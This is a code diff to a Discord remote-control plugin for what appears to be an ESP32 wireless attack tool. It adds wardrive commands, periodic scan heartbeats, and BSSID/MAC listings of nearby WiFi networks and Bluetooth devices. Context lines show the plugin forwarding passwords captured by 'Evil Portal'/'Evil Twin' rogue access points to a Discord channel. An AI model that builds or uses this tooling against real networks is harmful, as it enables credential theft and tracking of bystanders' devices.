@@ -139,6 +139,12 @@ class DiscordRemote(PluginBase):
         self._push_last_bt_scan_done = 0.0
         self._push_last_hs_count = -1
         self._push_last_terminal_idx = -1  # -1 = unset; baseline on first check
+        # periodic session heartbeat
+        self._push_interval = 0            # seconds; 0 = disabled
+        self._push_last_periodic = 0.0
+        self._push_session_start = 0.0
+        self._push_interval_wifi_base = 0
+        self._push_interval_bt_base = 0
         self._load_config()
 
     def menu_items(self) -> list[PluginMenuItem]:
@@ -243,6 +249,10 @@ class DiscordRemote(PluginBase):
             self._channel_id = 0
         self._allowed_users = _parse_ids(conf.get("DISCORD_ALLOWED_USERS", ""))
         self._push_events = conf.get("DISCORD_PUSH_EVENTS", "").lower() in ("1", "true", "yes")
+        try:
+            self._push_interval = max(0, int(conf.get("DISCORD_PUSH_INTERVAL", "0") or "0"))
+        except ValueError:
+            self._push_interval = 0
 
     def _configured(self) -> bool:
         return bool(self._token and self._channel_id and self._allowed_users)
@@ -262,6 +272,8 @@ class DiscordRemote(PluginBase):
         self._push_last_bt_scan_done = 0.0
         self._push_last_hs_count = -1
         self._push_last_terminal_idx = -1
+        self._push_last_periodic = 0.0
+        self._push_session_start = 0.0
         self._thread = threading.Thread(
             target=self._discord_worker,
             name="discord-remote",
@@ -380,40 +392,56 @@ class DiscordRemote(PluginBase):
         self._starting = False
 
     def _push(self, text: str) -> None:
-        """Send a proactive (unsolicited) message to the Discord channel."""
+        """Send a single proactive message to the Discord channel."""
+        self._push_many([text])
+
+    def _push_many(self, messages: list[str]) -> None:
+        """Send multiple messages sequentially in one coroutine so discord.py's
+        built-in rate-limit handling applies between sends."""
         loop = self._loop
         client = self._client
         if not (self._enabled and loop and client):
             return
         channel = client.get_channel(self._channel_id)
         if channel is None:
+            self._log_add("Push failed: channel not in cache", 8)
             return
+
+        plugin = self
+
+        async def _send_all():
+            for text in messages:
+                try:
+                    await channel.send(text[:MAX_REPLY] or "…")
+                except Exception as exc:
+                    plugin._log_add(f"Push error: {exc}", 8)
+
         try:
-            asyncio.run_coroutine_threadsafe(
-                channel.send(text[:MAX_REPLY] or "…"), loop)
-        except Exception:
-            pass
+            asyncio.run_coroutine_threadsafe(_send_all(), loop)
+        except Exception as exc:
+            self._log_add(f"Push schedule error: {exc}", 8)
 
     def _push_chunked(self, header: str, rows: list[str]) -> None:
-        """Send header + rows as one or more messages, each ≤ MAX_REPLY chars."""
+        """Split rows into MAX_REPLY-sized messages and send as one batch."""
         fence = "```"
-        # overhead per chunk: header\n```\n<rows>\n```
-        OVERHEAD = len(fence) * 2 + 4  # two fences + newlines
+        OVERHEAD = len(fence) * 2 + 4
         CONT_HEADER = "*(cont.)*"
         chunks: list[list[str]] = [[]]
         budget = MAX_REPLY - OVERHEAD - len(header)
 
         for row in rows:
-            needed = len(row) + 1  # +1 for newline
+            needed = len(row) + 1
             if budget - needed < 0 and chunks[-1]:
                 chunks.append([])
                 budget = MAX_REPLY - OVERHEAD - len(CONT_HEADER)
             chunks[-1].append(row)
             budget -= needed
 
+        messages = []
         for i, chunk in enumerate(chunks):
             h = header if i == 0 else CONT_HEADER
-            self._push(f"{h}\n{fence}\n" + "\n".join(chunk) + f"\n{fence}")
+            messages.append(f"{h}\n{fence}\n" + "\n".join(chunk) + f"\n{fence}")
+        self._push_many(messages)
 
     def _push_credential(self, tag: str, data: str) -> None:
         label = "Evil Portal" if tag == "EP" else "Evil Twin"
@@ -466,18 +494,79 @@ class DiscordRemote(PluginBase):
                     data = line.split("[ET:PWD]", 1)[-1].strip()
                     self._push_credential("ET", data)
 
+        # Periodic session heartbeat
+        import time as _time
+        now = _time.time()
+        any_active = (
+            getattr(app, "wifi_scanning",    False) or
+            getattr(app, "ble_scanning",     False) or
+            getattr(app, "_wifi_scan_only",  False) or
+            getattr(app, "_ble_scan_only",   False)
+        )
+        if any_active:
+            if self._push_session_start == 0.0:
+                self._push_session_start = now
+                self._push_last_periodic = now
+                self._push_interval_wifi_base = len(getattr(app, "wifi_networks", []))
+                self._push_interval_bt_base = len(getattr(app, "ble_devices", []))
+            elif (self._push_interval > 0
+                  and now - self._push_last_periodic >= self._push_interval):
+                self._push_last_periodic = now
+                self._push_session_update()
+        else:
+            self._push_session_start = 0.0
+
+    def _push_session_update(self) -> None:
+        import time as _time
+        app = self.app
+        if not app:
+            return
+        elapsed = int(_time.time() - self._push_session_start)
+        h, rem = divmod(elapsed, 3600)
+        m, s = divmod(rem, 60)
+        duration = (f"{h}h {m}m" if h else f"{m}m {s}s") if elapsed >= 60 else f"{s}s"
+
+        wifi_total = len(getattr(app, "wifi_networks", []))
+        bt_total   = len(getattr(app, "ble_devices",   []))
+        wifi_new   = wifi_total - self._push_interval_wifi_base
+        bt_new     = bt_total   - self._push_interval_bt_base
+        self._push_interval_wifi_base = wifi_total
+        self._push_interval_bt_base   = bt_total
+
+        hs  = getattr(app, "_last_hs_count", 0)
+        gps = "fix" if getattr(app, "gps_fix", False) else "no fix"
+        sats = getattr(app, "gps_sats", 0)
+
+        ops = []
+        if getattr(app, "wifi_scanning",   False): ops.append("WiFi wardrive")
+        if getattr(app, "ble_scanning",    False): ops.append("BT wardrive")
+        if getattr(app, "_wifi_scan_only", False): ops.append("WiFi scan")
+        if getattr(app, "_ble_scan_only",  False): ops.append("BT scan")
+
+        self._push("\n".join([
+            f"**[WDG] Session update** — {duration}",
+            f"Active:     {', '.join(ops) if ops else 'scanning'}",
+            f"WiFi nets:  +{wifi_new} new  ({wifi_total} total)",
+            f"BT devices: +{bt_new} new  ({bt_total} total)",
+            f"Handshakes: {hs}",
+            f"GPS:        {gps}  {sats} sats",
+        ]))
+        self._log_add(f"Session update sent ({duration})", 11)
+
     def _push_wifi_batch(self) -> None:
         app = self.app
         if not app:
             return
         nets = [n for n in app.wifi_networks if n.bssid not in self._push_wifi_seen]
+        self._log_add(
+            f"WiFi batch: {len(app.wifi_networks)} total, {len(nets)} new", 13)
         if not nets:
             return
         for n in nets:
             self._push_wifi_seen.add(n.bssid)
         noun = "network" if len(nets) == 1 else "networks"
         header = f"**[WiFi]** {len(nets)} new {noun}"
-        rows = [f"  {(n.ssid or '<hidden>'):<18} Ch:{n.channel:<3} {n.rssi}dBm"
+        rows = [f"  {n.bssid}  {(n.ssid or '<hidden>'):<18} Ch:{n.channel:<3} {n.rssi}dBm"
                 for n in nets]
         self._push_chunked(header, rows)
 
@@ -486,13 +575,15 @@ class DiscordRemote(PluginBase):
         if not app:
             return
         devs = [d for d in app.ble_devices if d.mac not in self._push_bt_seen]
+        self._log_add(
+            f"BT batch: {len(app.ble_devices)} total, {len(devs)} new", 13)
         if not devs:
             return
         for d in devs:
             self._push_bt_seen.add(d.mac)
         noun = "device" if len(devs) == 1 else "devices"
         header = f"**[BT]** {len(devs)} new {noun}"
-        rows = [f"  {d.name:<18} {d.rssi}dBm" for d in devs]
+        rows = [f"  {d.mac}  {(d.name or '?'):<18} {d.rssi}dBm" for d in devs]
         self._push_chunked(header, rows)
 
     def _drain_requests(self) -> None:
@@ -524,6 +615,8 @@ class DiscordRemote(PluginBase):
             return self._sdr(target)
         if head == "menu":
             return self._menu_cmd(parts[1:])
+        if head == "wardrive":
+            return self._wardrive_cmd(parts[1:])
         if head == "sys":
             return self._sys_text()
         if head == "stop":
@@ -532,6 +625,66 @@ class DiscordRemote(PluginBase):
             self._disable()
             return "📴 Discord remote disabled — re-enable locally from **PLUGINS**."
         return f"⚠️ Unknown command: `{command}`\n\n{self._help_text()}"
+
+    def _wardrive_cmd(self, parts: list[str]) -> str:
+        app = self.app
+        if not app:
+            return "App not ready"
+
+        sub  = parts[0] if parts else "status"
+        mode = parts[1].lower() if len(parts) > 1 else "wifi"
+
+        wifi_on = app._is_running("wardriving")
+        bt_on   = app._is_running("bt_scanning")
+
+        if sub == "status":
+            lines = ["**Wardrive status**", "```"]
+            lines.append(f"WiFi wardrive: {'ON' if wifi_on else 'off'}")
+            lines.append(f"BT wardrive:   {'ON' if bt_on else 'off'}")
+            lines.append(f"WiFi nets:     {len(getattr(app, 'wifi_networks', []))}")
+            lines.append(f"BT devices:    {len(getattr(app, 'ble_devices', []))}")
+            gps = "fix" if getattr(app, "gps_fix", False) else "no fix"
+            lines.append(f"GPS:           {gps}  {getattr(app, 'gps_sats', 0)} sats")
+            lines.append("```")
+            if self._push_interval > 0:
+                import time as _time
+                if self._push_session_start > 0:
+                    remaining = int(self._push_interval
+                                    - (_time.time() - self._push_last_periodic))
+                    lines.append(f"Next heartbeat in ~{max(0, remaining)}s")
+                else:
+                    lines.append(f"Heartbeat every {self._push_interval}s when active")
+            return "\n".join(lines)
+
+        if sub == "start":
+            if app._anything_running_on_esp():
+                return ("Another ESP32 operation is running — "
+                        "`!wdg stop` first or `!wdg wardrive stop`")
+            if not app._esp32:
+                if not app._try_reconnect_esp32():
+                    return "No ESP32 connected"
+            if mode == "bt":
+                if bt_on:
+                    return "BT wardrive already running"
+                app._start_scan_cmd("scan_bt", "bt_scanning", "BT Wardrive")
+                return "BT wardrive started"
+            else:
+                if wifi_on:
+                    return "WiFi wardrive already running"
+                app._start_scan_cmd("scan_networks", "wardriving", "WiFi Wardrive")
+                return ("WiFi wardrive started\n"
+                        "Tip: `!wdg wardrive start bt` once WiFi is running")
+
+        if sub == "stop":
+            if not wifi_on and not bt_on:
+                return "Wardrive not running"
+            return self._stop_all()
+
+        return ("Usage:\n"
+                "`!wdg wardrive`           — status\n"
+                "`!wdg wardrive start`     — start WiFi wardrive\n"
+                "`!wdg wardrive start bt`  — start BT wardrive\n"
+                "`!wdg wardrive stop`      — stop all")
 
     def _status_text(self) -> str:
         app = self.app
@@ -945,6 +1098,9 @@ class DiscordRemote(PluginBase):
             "## Watch Dogs Go Remote",
             "**Info**",
             "`!wdg status`  `!wdg sys`  `!wdg loot`  `!wdg tail`",
+            "",
+            "**Wardrive**",
+            "`!wdg wardrive`  `!wdg wardrive start`  `!wdg wardrive start bt`  `!wdg wardrive stop`",
             "",
             "**Scanning**",
             "`!wdg scan wifi`  `!wdg scan bt`",
